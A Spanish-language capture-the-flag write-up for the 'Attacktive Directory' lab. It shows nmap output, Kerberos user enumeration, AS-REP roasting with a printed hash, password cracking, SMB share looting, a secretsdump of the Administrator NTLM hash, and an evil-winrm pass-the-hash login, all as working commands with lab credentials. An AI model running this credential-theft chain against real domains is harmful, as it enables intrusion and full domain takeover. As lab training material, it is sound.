# Attacktive directory

## Initial Scan
```
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-11 14:20:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-09-11T14:22:43+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-09-10T14:01:47
|_Not valid after:  2021-03-12T14:01:47
|_ssl-date: 2020-09-11T14:22:57+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49807/tcp open  msrpc         Microsoft Windows RPC

```
## Enum
### Enum4Linux
```
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
Domain Name: THM-AD
```
### Kebrute
Antes de tirar de kebrute añadimos el DNS spookysec.local a /etc/hosts (Lo obtuvimos con el primer escaneo)
```
kebrute -d spookysec.local --dc spookysec.local userenum userlist.txt
2020/09/11 16:50:18 >  [+] VALID USERNAME:	 james@spookysec.local
2020/09/11 16:50:18 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2020/09/11 16:50:18 >  [+] VALID USERNAME:	 James@spookysec.local
2020/09/11 16:50:18 >  [+] VALID USERNAME:	 robin@spookysec.local
2020/09/11 16:50:19 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2020/09/11 16:50:19 >  [+] VALID USERNAME:	 administrator@spookysec.local
2020/09/11 16:50:20 >  [+] VALID USERNAME:	 backup@spookysec.local
2020/09/11 16:50:20 >  [+] VALID USERNAME:	 paradox@spookysec.local
2020/09/11 16:50:26 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2020/09/11 16:50:27 >  [+] VALID USERNAME:	 Robin@spookysec.local
2020/09/11 16:50:31 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2020/09/11 16:50:39 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2020/09/11 16:50:42 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2020/09/11 16:50:51 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2020/09/11 16:50:54 >  [+] VALID USERNAME:	 ori@spookysec.local
2020/09/11 16:50:59 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
```
Varios usuarios de los que hay pueden ser potencialmente jugosos como admin , svc-admin o backup, valdria la pena checkear cosas como el ASREPRoasting

### GetNPUuser
```
GetNPUsers.py  spookysec.local/svc-admin -format john
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate svc-admin, getting its TGT
$krb5asrep$svc-admin@SPOOKYSEC.LOCAL:99f8cfd98b1f1679f22d437b4121fb92$ad5af5234e6cd1719970a67221a0efdd563ac66043f5401af5ed87807c9f78c5ff5688598041496024caff6db6b57ae81af7233a4b9595e4b9b0edb251753bb3645591f6a17b337d222419778a90ba5f83866041e5ed12e4c00e3db7c54db439053dae1de53229731ccf8f1ab23505a00f43692a8778b3216d1dd1a221dc68a11c574f6100dad69eea74bc272d691393a499c9071ae1b0075d6c73906327d822107fd91aba0841d8928bc26cc8625c5850d808438f58cb3e2c2b1aeb0a3266e191d8ac3b50f5f906a773730536edabdf2bfd2d1208d53598b9d5c28fca808e5554fd256c9f5118de2bbf46d77888519e5d7f
```
Lo crackeamos con johntheripper y la wordlist de la room
```
management2005   ($krb5asrep$svc-admin@SPOOKYSEC.LOCAL)
```
### SMB
Teninedo unas creed validas podemos acceder a los shares de la máquina, listemos primero
```
smbclient -L spookysec.local -U svc-admin
Enter WORKGROUP\svc-admin's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
El backup parece jugoson, veamos que hay en el 
```
pj@crow-foot:~/Current/THM$ smbclient \\\\spookysec.local\\backup -U svc-admin
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

		8247551 blocks of size 4096. 5267638 blocks available
smb: \> get backup_credentials.txt 
```
Con esto tenemos las credenciales del usuario backup en base64, decodifiquemoslo y nos queda:
```
backup@spookysec.local:backup2517860
```

## Privesc 
Con el usuario backup del dc podemos usar el secretdumper de impacket para dumpear todos los hashes del dc y posteriormente ejecurtar un pass the hash con la cuenta del administrador 
```
secretsdump.py backup@spookysec.local -just-dc-ntlm -just-dc-user Administrator
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b:::
[*] Cleaning up... 
```
Con esto ya esta gg la máquina realmente solo queda hacer el pass the hash con evilwinRM
```
evil-winrm -i 10.10.248.20 -u Administrator -H e4876a80a723612986d7609aa5ebc12b
``


